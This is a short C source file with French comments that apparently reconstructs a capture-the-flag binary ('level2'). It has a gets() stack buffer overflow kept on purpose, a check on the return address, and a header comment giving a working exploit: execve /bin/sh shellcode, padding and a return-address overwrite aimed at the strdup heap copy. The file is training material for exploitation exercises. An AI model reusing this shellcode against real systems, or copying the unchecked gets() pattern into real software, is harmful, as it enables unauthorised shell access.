/*
	Pour compiler le .c:
	gcc -m32 -fno-stack-protector -z execstack source.c -o level2

	Ensuite:
	python -c 'print "\x31\xdb\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\x83\xe4\xf0\xcd\x80" + 52 * "-" + "\xb0\x84\x04\x08"' > ./lvl2

	Pour finir:
	cat ./lvl2 - | ./level2
*/
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void	p(void)
{
	char	str[76];	// Définition du buffer
	int		*eip;		// Valeur de retour du gets qui va nous permettre d'effectuer le check

	fflush(stdout);		// Force l'écriture de toutes les données se trouvant dans stdout
	gets(str);			// Saisie de caractères et de chaînes
	eip = __builtin_return_address(0);	// Permet d'avoir l'adresse de retour de la fonction actuelle ou de la fonction appelante
	if (((unsigned long)eip & 0xb0000000) == 0xb0000000) {	// Check pour voir si l'eip commence par 0xb...
		printf("(%p)\n", eip);	// Affichage de l'adresse
		exit(1);
	}
	puts(str);					// Affichage de la chaine entrée dans gets
	strdup(str);				// On retourne la chaine allouée
	return ;
}

int		main(void)
{
	p();
	return 0;
}
